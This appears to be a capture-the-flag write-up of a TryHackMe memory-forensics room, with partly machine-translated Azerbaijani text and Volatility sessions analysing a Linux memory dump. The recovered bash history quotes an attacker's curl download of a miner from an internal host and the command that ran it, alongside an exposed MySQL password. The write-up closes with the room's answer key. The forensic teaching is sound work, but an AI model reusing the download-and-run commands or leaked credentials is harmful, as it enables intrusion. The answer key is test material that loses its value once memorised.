# VolMemForensics
Volatility Memory Forensics


												TryHackMe - Advent Of Cyber 2023 | Memory Forensics
												===================================================


Learning Objectives
-------------------


Yaddaş kriminalistikasının nə olduğunu və ondan rəqəmsal məhkəmə araşdırmasında necə istifadə olunacağını anlayın
Uçucu məlumatların və yaddaş zibillərinin nə olduğunu anlayın
Dəyişkənlik və onun yaddaş zibilini təhlil etmək üçün necə istifadə oluna biləcəyi haqqında məlumat əldə edin
Dəyişkənlik profilləri haqqında məlumat əldə edin

What Is Memory Forensics
------------------------

Uçucu yaddaş təhlili və ya təsadüfi giriş yaddaşı (RAM) kriminalistikası kimi də tanınan yaddaş kriminalistikası rəqəmsal kriminalistikanın bir qoludur. Bu, kompüter təhlükəsizliyi insidentləri, kibercinayətlər və digər məhkəmə araşdırmaları ilə bağlı rəqəmsal sübutları və artefaktları aşkar etmək üçün kompüterin uçucu yaddaşının (RAM) yoxlanılmasını və təhlilini əhatə edir. Bu, diskdəki bütün faylların bərpa oluna və sonra tədqiq oluna biləcəyi sabit disk ekspertizasından fərqlənir. Yaddaş kriminalistikası yaddaş zibilinin yaradılması zamanı işləyən proqramlara diqqət yetirir. Bu tip məlumat dəyişkəndir, çünki kompüter söndürüldükdə silinəcək.



What Is Volatile Data
---------------------

Kompüter məhkəmə ekspertizasında uçucu məlumatlar kompüterin yaddaşında (RAM) müvəqqəti saxlanılan və kompüter söndürüldükdə və ya yenidən işə salındıqda asanlıqla itirilə və ya dəyişdirilə bilən məlumatlara aiddir. Dəyişən məlumatlar rəqəmsal tədqiqatçılar üçün çox vacibdir, çünki o, hadisə zamanı kompüterin vəziyyətinin şəklini verir. İstənilən hadisəyə cavab verən şəxs dəyişkən məlumatların nə olduğunu bilməlidir. Səbəb odur ki, təhlükəyə məruz qalmış cihaza baxarkən ilkin reaksiya təhlükəni ehtiva etmək üçün cihazı söndürmək ola bilər.

Uçucu məlumatların bəzi nümunələri işləyən proseslər, şəbəkə əlaqələri və RAM məzmunlarıdır. Volan verilənlər diskə yazılmır və yaddaşda daim dəyişir. Məsələ ondadır ki, hər hansı zərərli proqram yaddaşda işləyəcək, yəni zərərli proqramdan yaranan istənilən şəbəkə əlaqələri və işləyən proseslər itiriləcək. Cihazı söndürmək qiymətli sübutların məhv edilməsi deməkdir.



What Is a Memory Dump
---------------------

Yaddaş çöpü yaddaş analizini yerinə yetirmək üçün çəkilmiş yaddaşın anlıq görüntüsüdür. O, yaddaş zibilinin yaradılması zamanı çəkilmiş işləyən proseslərə aid məlumatları ehtiva edəcəkdir.



Benefits of Memory Forensics
----------------------------

Yaddaş məhkəmə ekspertizası kompüterin qeyri-sabit yaddaşından real vaxt məlumatları əldə etməklə rəqəmsal araşdırmalarda dəyərli üstünlüklər təklif edir. O, davam edən fəaliyyətlər haqqında sürətli məlumat verir, gizli təhdidləri aşkarlayır, parollar kimi dəyişkən məlumatları ələ keçirir və tədqiqatçılara hadisələr zamanı istifadəçi hərəkətlərini və sistem vəziyyətlərini başa düşməyə imkan verir - bunların hamısı hədəf sistemi dəyişdirmədən. Başqa sözlə, yaddaş ekspertizası zərərli aktyorları təsdiq etməyə kömək edir' icazəsiz və ya zərərli hərəkətlərin sübutunu aşkar etmək üçün kompüter sisteminin dəyişkən yaddaşını təhlil etməklə fəaliyyətlər. O, təcavüzkarın taktikası, texnikası və potensial kompromis göstəriciləri (IOC) ilə bağlı mühüm anlayışlar təqdim edir.

Unutmamaq lazım olan başqa bir şey odur ki, cihazın sabit disk şəklini çəkmək çox vaxt apara bilər. Sonra, ölçüsü yüzlərlə gigabayt ola bilən təsvirin ötürülməsi problemini nəzərdən keçirməlisiniz - və bu, hətta analizin hadisəyə cavab (IR) komandasının nə qədər vaxt aparacağını düşünməzdən əvvəl. Yaddaş təhlilinin IR komandasına həqiqətən kömək edə biləcəyi yer budur; hər hansı bir cihazdan yaddaş zibilini çəkmək daha sürətli və daha kiçik olacaq. Fərz edək ki, biz RAM-a sabit disk şəklinə üstünlük veririk. Bu halda, IR komandası sabit diskin şəklini çəkmək prosesinə başlayarkən artıq IOC-lar üçün yaddaş boşluğunu təhlil etməyə başlaya bilər.


User Process	 -      Bunlar istifadəçinin başlatdığı proseslərdir. Onlar adətən tətbiqləri və proqram istifadəçilərinin birbaşa qarşılıqlı əlaqəsini əhatə edir.
Example: Firefox: Bu, internetdə sörf etmək üçün istifadə edə biləcəyimiz veb brauzerdir.



Background Process	 -    Bunlar birbaşa istifadəçi əlaqəsi olmadan işləyən proseslərdir. Onlar tez-tez sistemin işləməsi və ya istifadəçi proseslərinə xidmətlər göstərmək üçün vacib olan vəzifələri yerinə yetirirlər.
Example: Avtomatlaşdırılmış ehtiyat nüsxələri: Yedəkləmə proqramı tez-tez arxa planda işləyir, onların təhlükəsizliyini və bərpa oluna bilməsini təmin etmək üçün vaxtaşırı məlumatların ehtiyat nüsxəsini çıxarır.



ubuntu@volatility:~$ vol.py -h
Volatility Foundation Volatility Framework 2.6.1
Usage: Volatility - A memory forensics analysis platform.

Options:
  -h, --help            list all available options and their default values.
                        Default values may be set in the configuration file
                        (/etc/volatilityrc)
  --conf-file=/home/ubuntu/.volatilityrc
                        User based configuration file
  -d, --debug           Debug volatility
  --plugins=PLUGINS     Additional plugin directories to use (colon separated)
  --info                Print information about all registered objects
  --cache-directory=/home/ubuntu/.cache/volatility
                        Directory where cache files are stored
  --cache               Use caching
  --tz=TZ               Sets the (Olson) timezone for displaying timestamps
                        using pytz (if installed) or tzset

ubuntu@volatility:~$ vol.py --info
Volatility Foundation Volatility Framework 2.6.1


Profiles
--------
VistaSP0x64           - A Profile for Windows Vista SP0 x64
VistaSP0x86           - A Profile for Windows Vista SP0 x86
VistaSP1x64           - A Profile for Windows Vista SP1 x64
VistaSP1x86           - A Profile for Windows Vista SP1 x86
VistaSP2x64           - A Profile for Windows Vista SP2 x64
VistaSP2x86           - A Profile for Windows Vista SP2 x86
Win10x64              - A Profile for Windows 10 x64
Win10x64_10240_17770  - A Profile for Windows 10 x64 (10.0.10240.17770 / 2018-02-10)
Win10x64_10586        - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23)
Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)
Win10x64_15063        - A Profile for Windows 10 x64 (10.0.15063.0 / 2017-04-04)
Win10x64_16299        - A Profile for Windows 10 x64 (10.0.16299.0 / 2017-09-22)
Win10x64_17134        - A Profile for Windows 10 x64 (10.0.17134.1 / 2018-04-11)
Win10x64_17763        - A Profile for Windows 10 x64 (10.0.17763.0 / 2018-10-12)
Win10x64_18362        - A Profile for Windows 10 x64 (10.0.18362.0 / 2019-04-23)
Win10x64_19041        - A Profile for Windows 10 x64 (10.0.19041.0 / 2020-04-17)
Win10x86              - A Profile for Windows 10 x86
Win10x86_10240_17770  - A Profile for Windows 10 x86 (10.0.10240.17770 / 2018-02-10)
Win10x86_10586        - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28)
Win10x86_14393        - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16)
Win10x86_15063        - A Profile for Windows 10 x86 (10.0.15063.0 / 2017-04-04)
Win10x86_16299        - A Profile for Windows 10 x86 (10.0.16299.15 / 2017-09-29)


Qeyd: Əgər Linux profilini necə yaratmağınızla maraqlanırsınızsa, bu məqaləni< tapa bilərsiniz. a i=3> Nicolas Béguier tərəfindən çox faydalıdır.  - https://beguier.eu/nicolas/articles/security-tips-3-volatility-linux-profiles.html

ubuntu@volatility:~$ cd ~/Desktop/Evidence/
ubuntu@volatility:~/Desktop/Evidence$ ls
Ubuntu_5.4.0-163-generic_profile.zip  linux.mem
ubuntu@volatility:~/Desktop/Evidence$ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ ls ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
Ubuntu_5.4.0-163-generic_profile.zip  __init__.py  __init__.pyc  elf.py  elf.pyc  linux.py  linux.pyc
ubuntu@volatility:~/Desktop/Evidence$ vol.py --info | grep Ubuntu
Volatility Foundation Volatility Framework 2.6.1
LinuxUbuntu_5_4_0-163-generic_profilex64 - A Profile for Linux Ubuntu_5.4.0-163-generic_profile x64
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" -h
Volatility Foundation Volatility Framework 2.6.1 Usage: Volatility - A memory forensics analysis platform.

Options:
  -h, --help            List all available options and their default values. 
  --conf-file=/home/thm/.volatilityrc 
User based configuration file
  --d, --debug          Debug volatility

--cropped for brevity--

Supported Plugin Commands:
linux_banner           Prints the Linux banner information
linux_bash             Recover bash history from bash process memory
linux_bash_env         Recover a process' dynamic environment variables
linux_enumerate_files  Lists files referenced by the filesystem cache
linux_find_file        Lists and recovers files from memory
linux_lsmod            Gather loaded kernel modules
linux_malfind          Looks for suspicious process mappings 
linux_procdump         Dumps a process's executable image to disk
linux_pslist           Gather active tasks by walking the task_struct->task list

--cropped for brevity--
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
    8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
    8092 bash                 2023-10-02 18:15:55 UTC+0000   make
    8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history 
    8092 bash                 2023-10-02 18:16:38 UTC+0000    
    8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history 
   10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
   10205 bash                 2023-10-02 18:19:58 UTC+0000   id
   10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
   10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history 
   10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff9ce9bd5baf00 systemd              1               0               0               0      0x000000007c3ae000 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5bc680 kthreadd             2               0               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b9780 rcu_gp               3               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b8000 rcu_par_gp           4               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d4680 kworker/0:0H         6               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d0000 mm_percpu_wq         8               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d5e00 ksoftirqd/0          9               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d2f00 rcu_sched            10              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d9780 migration/0          11              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d8000 idle_inject/0        12              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dde00 kworker/0:1          13              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5daf00 cpuhp/0              14              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dc680 kdevtmpfs            15              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd632f00 netns                16              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd634680 rcu_tasks_kthre      17              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd631780 kauditd              18              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd630000 khungtaskd           19              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd635e00 oom_reaper           20              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6eaf00 writeback            21              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ec680 kcompactd0           22              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e9780 ksmd                 23              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e8000 khugepaged           24              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73af00 kintegrityd          70              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74de00 kblockd              71              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74af00 blkcg_punt_bio       72              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74c680 tpm_dev_wq           73              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd749780 ata_sff              74              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd748000 md                   75              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73de00 edac-poller          76              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd738000 devfreq_wq           77              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd739780 watchdogd            78              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73c680 kworker/u2:1         79              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f8000 kswapd0              81              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f9780 ecryptfs-kthrea      82              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6faf00 kthrotld             84              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f1780 acpi_thermal_pm      85              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f4680 scsi_eh_0            86              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f2f00 scsi_tmf_0           87              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f5e00 scsi_eh_1            88              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f0000 scsi_tmf_1           89              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6fde00 vfio-irqfd-clea      91              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ede00 kworker/u2:3         92              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71de00 ipv6_addrconf        93              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd70c680 kstrp                102             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd705e00 kworker/u3:0         105             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9af00 charger_manager      118             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9c680 kworker/0:1H         119             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf90000 scsi_eh_2            159             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd719780 scsi_tmf_2           161             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71af00 cryptd               162             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbb35e00 irq/18-vmwgfx        187             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf9de00 ttm_swap             189             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbadde00 kdmflush             211             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bd708000 raid5wq              237             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf91780 jbd2/dm-0-8          284             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad9780 ext4-rsv-conver      285             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce971889780 systemd-journal      355             1               0               0      0x0000000072d08000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbf98000 systemd-udevd        387             1               0               0      0x0000000071040000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad8000 iprt-VBoxWQueue      404             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbadc680 kaluad               508             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188af00 kmpath_rdacd         509             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188de00 kmpathd              510             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188c680 kmpath_handlerd      511             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbf92f00 multipathd           512             1               0               0      0x000000006fc32000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd702f00 loop0                523             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd700000 loop1                527             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b9338000 jbd2/sda2-8          529             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b933de00 ext4-rsv-conver      530             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd709780 systemd-timesyn      556             1               102             104    0x000000007adb8000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd701780 systemd-network      763             1               100             102    0x0000000070650000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70af00 systemd-resolve      766             1               101             103    0x0000000070438000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70de00 accounts-daemon      801             1               0               0      0x000000006f0dc000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9bbc11780 cron                 805             1               0               0      0x0000000070456000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b933c680 dbus-daemon          809             1               103             106    0x0000000072498000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef21780 networkd-dispat      821             1               0               0      0x0000000079288000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a2f00 polkitd              823             1               0               0      0x00000000792e8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a0000 rsyslogd             828             1               104             110    0x0000000076344000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a5e00 snapd                829             1               0               0      0x0000000074f3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef25e00 systemd-logind       830             1               0               0      0x000000007c310000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5639780 udisksd              832             1               0               0      0x00000000756ca000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5638000 atd                  833             1               0               0      0x00000000756d8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4feaf00 ModemManager         881             1               0               0      0x00000000763e2000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fec680 unattended-upgr      899             1               0               0      0x0000000073a3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fe8000 agetty               901             1               0               0      0x0000000073040000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b0ad1780 sshd                 1400            1               0               0      0x00000000705a4000 2023-10-02 18:08:17 UTC+0000
0xffff9ce9b2f51780 kworker/0:5          1942            2               0               0      ------------------ 2023-10-02 18:10:08 UTC+0000
0xffff9ce9b32e0000 sshd                 7989            1400            0               0      0x0000000073eb4000 2023-10-02 18:13:49 UTC+0000
0xffff9ce9b58eaf00 systemd              8009            1               1000            1000   0x0000000031b06000 2023-10-02 18:13:59 UTC+0000


vol.py -f linux.mem - profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10280

ubuntu@volatility:~/Desktop/Evidence$ mkdir extracted
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p PID
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 miner                PID             0x0000000000400000 extracted/miner.PID.0x400000

ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 mysqlserver          10291           0x0000000000400000 extracted/mysqlserver.10291.0x400000

ubuntu@volatility:~/Desktop/Evidence$ ls extracted/
miner.PID.0x400000 mysqlserver.10291.0x400000

ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/miner.PID.0x400000              
REDACTED  extracted/miner.PID.0x400000

ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/mysqlserver.10291.0x400000              
REDACTED  extracted/mysqlserver.10291.0x400000

ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron 
Volatility Foundation Volatility Framework 2.6.1 
0xffff9ce9bc312e80                       684 /home/crond.reboot
0xffff9ce9bb88f6f0                       682 /home/crond.pid
0xffff9ce9bb88cbb0                       679 /home/systemd/units/invocation:cron.service
0xffff9ce9baa31a98                    138255 /var/spool/cron
0xffff9ce9baa72bb8                    138259 /var/spool/cron/crontabs
0xffff9ce9b78280e8                    132687 /var/spool/cron/crontabs/elfie
0xffff9ce9baa54568                    138257 /var/spool/cron/atjobs
0xffff9ce9baa31650                     13246 /usr/sbin/cron
0xffff9ce9b7829ee0                       582 /usr/bin/crontab
               0x0 ------------------------- /usr/lib/systemd/system/cron.service.d
0xffff9ce9bc47d688                     10065 /usr/lib/systemd/system/cron.service

--cropped for brevity--

ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie 
Volatility Foundation Volatility Framework 2.6.1 
ubuntu@volatility:~/Desktop/Evidence$ ls extracted/
elfie  miner.PID.0x400000  mysqlserver.10291.0x400000

https://github.com/volatilityfoundation/volatility
https://github.com/volatilityfoundation/volatility3


What is the exposed password that we find from the bash history output?
Answer: NEhX4VSrN7sV

What is the PID of the miner process that we find?
Answer: 10280

What is the MD5 hash of the miner process?
Answer: 153a5c8efe4aa3be240e5dc645480dee

What is the MD5 hash of the mysqlserver process?
Answer: c586e774bb2aa17819d7faae18dad7d1

Use the command strings extracted/miner.<PID from question 2>.0x400000 | grep http://. What is the suspicious URL? (Fully defang the URL using CyberChef)
Answer: hxxp[://]mcgreedysecretc2[.]thm

After reading the elfie file, what location is the mysqlserver process dropped in on the file system?
Answer: /var/tmp/.system-python3.8-updates/mysqlserver


